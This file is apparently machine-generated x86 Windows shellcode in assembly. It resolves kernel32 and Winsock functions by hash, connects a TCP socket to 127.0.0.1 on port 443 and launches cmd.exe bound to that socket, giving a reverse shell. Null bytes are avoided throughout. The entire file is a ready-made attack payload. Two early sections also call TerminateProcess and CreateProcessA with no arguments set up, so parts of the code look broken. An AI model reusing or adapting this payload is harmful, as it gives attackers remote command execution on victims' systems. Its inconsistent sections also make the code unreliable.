; ======================================================================
; Auto-generated X86 Windows Shellcode
; Architecture: x86
; Bad chars: {0x00}
; ======================================================================

; ==========================================================================
; Setup stack frame and find kernel32.dll (x86)
; ==========================================================================
start:
    mov ebp, esp                ; Set up stack frame
    add esp, 0xfffff9f0         ; Allocate space (avoids NULL bytes: -0x610)

find_kernel32:
    xor ecx, ecx                ; Zero ECX
    mov esi, fs:[ecx+0x30]      ; ESI = pointer to PEB
    mov esi, [esi+0x0C]         ; ESI = PEB->Ldr
    mov esi, [esi+0x1C]         ; ESI = PEB->Ldr.InInitOrder

next_module:
    mov ebx, [esi+0x08]         ; EBX = current module base address
    mov edi, [esi+0x20]         ; EDI = current module name (unicode)
    mov esi, [esi]              ; ESI = next module (Flink)
    cmp word ptr [edi+12*2], cx ; Check if position 12 == 0x00 (kernel32 = 12 chars)
    jne next_module             ; Repeat if not found

; ==========================================================================
; Reusable find_function subroutine (callable via [ebp+0x04])
; ==========================================================================
find_function_shorten:
    jmp find_function_shorten_bnc

find_function_ret:
    pop esi                     ; POP return address from stack
    mov [ebp+0x04], esi         ; Save find_function address at [ebp+0x04]
    jmp resolve_symbols_kernel32

find_function_shorten_bnc:
    call find_function_ret      ; CALL with negative offset

find_function:
    pushad                      ; Save all registers
                                ; EBX = kernel32 base from previous step
    mov eax, [ebx+0x3C]         ; Offset to PE signature
    mov edi, [ebx+eax+0x78]     ; Export Table RVA
    add edi, ebx                ; Export Table VA
    mov ecx, [edi+0x18]         ; NumberOfNames
    mov eax, [edi+0x20]         ; AddressOfNames RVA
    add eax, ebx                ; AddressOfNames VA
    mov [ebp-4], eax            ; Save AddressOfNames VA

find_function_loop:
    jecxz find_function_finished
    dec ecx
    mov eax, [ebp-4]            ; Restore AddressOfNames VA
    mov esi, [eax+ecx*4]        ; Get RVA of symbol name
    add esi, ebx                ; Get VA of symbol name

compute_hash:
    xor eax, eax                ; NULL EAX
    cdq                         ; NULL EDX
    cld                         ; Clear direction flag

compute_hash_again:
    lodsb                       ; Load next byte from ESI into AL
    test al, al                 ; Check for NULL terminator
    jz compute_hash_finished
    push ecx                    ; Save ECX
    xor ecx, ecx                ; Zero ECX
    mov cl, 15                  ; CL = 15
    sub cl, 2                   ; CL = 13 (avoids 0x0D literal)
    ror edx, cl                 ; Rotate EDX by CL bits right
    pop ecx                     ; Restore ECX
    add edx, eax                ; Add byte to accumulator
    jmp compute_hash_again

compute_hash_finished:

find_function_compare:
    cmp edx, [esp+0x24]         ; Compare hash with requested hash (from push before call)
    jnz find_function_loop      ; Continue if no match
    mov edx, [edi+0x24]         ; AddressOfNameOrdinals RVA
    add edx, ebx                ; AddressOfNameOrdinals VA
    mov cx, [edx+2*ecx]         ; Get function ordinal
    mov edx, [edi+0x1C]         ; AddressOfFunctions RVA
    add edx, ebx                ; AddressOfFunctions VA
    mov eax, [edx+4*ecx]        ; Get function RVA
    add eax, ebx                ; Get function VA
    mov [esp+0x1C], eax         ; Overwrite saved EAX in pushad

find_function_finished:
    popad                       ; Restore registers (EAX now contains function address)
    ret

; ==========================================================================
; Resolve essential kernel32.dll functions
; ==========================================================================
resolve_symbols_kernel32:
    mov [ebp+0x10], ebx         ; Save kernel32.dll base at [ebp+0x10]
    push 0xec0e4e8e             ; LoadLibraryA hash
    call dword ptr [ebp+0x04]   ; Call find_function
    mov [ebp+0x08], eax         ; Save LoadLibraryA at [ebp+0x08]


; ==========================================================================
; Pre-resolve all APIs upfront
; ==========================================================================

; Resolve kernel32.dll APIs (EBX already contains kernel32 base)
    push 0x78b5b983       ; TerminateProcess hash
    call dword ptr [ebp+0x04]   ; Call find_function
    mov [ebp+0x14], eax    ; Save TerminateProcess
    push 0x16b3fe72       ; CreateProcessA hash
    call dword ptr [ebp+0x04]   ; Call find_function
    mov [ebp+0x18], eax    ; Save CreateProcessA


; ==========================================================================
; Call #1: TerminateProcess()
; ==========================================================================

; Prepare string arguments for TerminateProcess

; Push arguments for TerminateProcess (right to left)
    call dword ptr [ebp+0x14]  ; Call TerminateProcess


; ==========================================================================
; Call #2: CreateProcessA()
; ==========================================================================

; Prepare string arguments for CreateProcessA

; Push arguments for CreateProcessA (right to left)
    call dword ptr [ebp+0x18]  ; Call CreateProcessA


; ==========================================================================
; Call #3: _CUSTOM_REVERSE_SHELL()
; ==========================================================================

    ; ===== After boilerplate with pre_resolve, we have: =====
    ; [ebp+0x04] = find_function address
    ; [ebp+0x08] = LoadLibraryA
    ; [ebp+0x10] = kernel32.dll base
    ; [ebp+0x14] = TerminateProcess (pre-resolved)
    ; [ebp+0x18] = CreateProcessA (pre-resolved)

    ; ===== Load ws2_32.dll using LoadLibraryA =====
    xor eax, eax
    mov ax, 0x6c6c                ; "ll"
    push eax
    push 0x642e3233               ; "32.d"
    push 0x5f327377               ; "ws2_"
    push esp                      ; Pointer to "ws2_32.dll"
    call dword ptr [ebp+0x08]     ; Call LoadLibraryA
    mov ebx, eax                  ; Save ws2_32.dll base in EBX

    ; Resolve WSAStartup
    push 0x3bfcedcb               ; WSAStartup hash
    call dword ptr [ebp+0x04]     ; Call find_function
    mov [ebp+0x1c], eax           ; Save WSAStartup at [ebp+0x1c]

    ; Resolve WSASocketA
    push 0xadf509d9               ; WSASocketA hash
    call dword ptr [ebp+0x04]     ; Call find_function
    mov [ebp+0x20], eax           ; Save WSASocketA at [ebp+0x20]

    ; Resolve WSAConnect
    push 0xb32dba0c               ; WSAConnect hash
    call dword ptr [ebp+0x04]     ; Call find_function
    mov [ebp+0x24], eax           ; Save WSAConnect at [ebp+0x24]

    ; ===== Call WSAStartup =====
    mov eax, esp
    xor ecx, ecx
    mov cx, 0x590                 ; Allocate space for WSADATA
    sub eax, ecx
    push eax                      ; lpWSAData
    xor eax, eax
    mov ax, 0x0202                ; wVersionRequested = 2.2
    push eax
    call dword ptr [ebp+0x1c]     ; Call WSAStartup

    ; ===== Call WSASocketA =====
    xor eax, eax
    push eax                      ; dwFlags = 0
    push eax                      ; g = 0
    push eax                      ; lpProtocolInfo = NULL
    mov al, 0x06                  ; IPPROTO_TCP
    push eax
    sub al, 0x05                  ; SOCK_STREAM = 1
    push eax
    inc eax                       ; AF_INET = 2
    push eax
    call dword ptr [ebp+0x20]     ; Call WSASocketA
    mov esi, eax                  ; Save socket in ESI

    ; ===== Build sockaddr_in and call WSAConnect =====
    xor eax, eax
    push eax                      ; sin_zero[4-7]
    push eax                      ; sin_zero[0-3]
    push 0x0100007f         ; sin_addr (IP in network byte order)
    mov ax, 0xbb01     ; sin_port (port in network byte order)
    shl eax, 0x10
    add ax, 0x02                  ; sin_family = AF_INET
    push eax
    push esp                      ; pointer to sockaddr_in
    pop edi                       ; Save sockaddr pointer in EDI

    xor eax, eax
    push eax                      ; lpGQOS = NULL
    push eax                      ; lpSQOS = NULL
    push eax                      ; lpCalleeData = NULL
    push eax                      ; lpCallerData = NULL
    add al, 0x10                  ; namelen = 16
    push eax
    push edi                      ; name = &sockaddr_in
    push esi                      ; s = socket
    call dword ptr [ebp+0x24]     ; Call WSAConnect

    ; ===== Build STARTUPINFOA =====
    push esi                      ; hStdError = socket
    push esi                      ; hStdOutput = socket
    push esi                      ; hStdInput = socket
    xor eax, eax
    push eax                      ; lpReserved2 = NULL
    push eax                      ; cbReserved2 & wShowWindow = 0
    mov al, 0x80
    xor ecx, ecx
    mov cl, 0x80
    add eax, ecx                  ; dwFlags = 0x100 (STARTF_USESTDHANDLES)
    push eax
    xor eax, eax
    push eax                      ; dwFillAttribute = 0
    push eax                      ; dwYCountChars = 0
    push eax                      ; dwXCountChars = 0
    push eax                      ; dwYSize = 0
    push eax                      ; dwXSize = 0
    push eax                      ; dwY = 0
    push eax                      ; dwX = 0
    push eax                      ; lpTitle = NULL
    push eax                      ; lpDesktop = NULL
    push eax                      ; lpReserved = NULL
    mov al, 0x44                  ; cb = 68 (sizeof STARTUPINFOA)
    push eax
    push esp                      ; pointer to STARTUPINFOA
    pop edi                       ; Save STARTUPINFOA pointer in EDI

    ; ===== Build command string "cmd.exe" (simplified encoding) =====
    mov eax, 0xff9a879b           ; Encoded value
    neg eax                       ; NEG to get 0x00657865 ("exe\0")
    push eax
    push 0x2e646d63               ; Direct push "cmd." (no NEG encoding needed if no bad chars)
    push esp                      ; Pointer to shell string
    pop ebx                       ; Save pointer to shell in EBX

    ; ===== Allocate PROCESS_INFORMATION and call CreateProcessA =====
    mov eax, esp
    xor ecx, ecx
    mov cx, 0x390                 ; Allocate space for PROCESS_INFORMATION
    sub eax, ecx
    push eax                      ; lpProcessInformation
    push edi                      ; lpStartupInfo (STARTUPINFOA pointer)
    xor eax, eax
    push eax                      ; lpCurrentDirectory = NULL
    push eax                      ; lpEnvironment = NULL
    push eax                      ; dwCreationFlags = 0
    inc eax                       ; bInheritHandles = TRUE
    push eax
    dec eax                       ; NULL
    push eax                      ; lpThreadAttributes = NULL
    push eax                      ; lpProcessAttributes = NULL
    push ebx                      ; lpCommandLine = command pointer
    push eax                      ; lpApplicationName = NULL

    ; ===== Call CreateProcessA (pre-resolved) =====
    call dword ptr [ebp+0x18]     ; Call CreateProcessA from pre-resolve

    ; ===== Exit with TerminateProcess (pre-resolved) =====
    xor ecx, ecx
    push ecx                      ; uExitCode = 0
    push 0xFFFFFFFF               ; hProcess = -1 (current process)
    call dword ptr [ebp+0x14]     ; Call TerminateProcess from pre-resolve

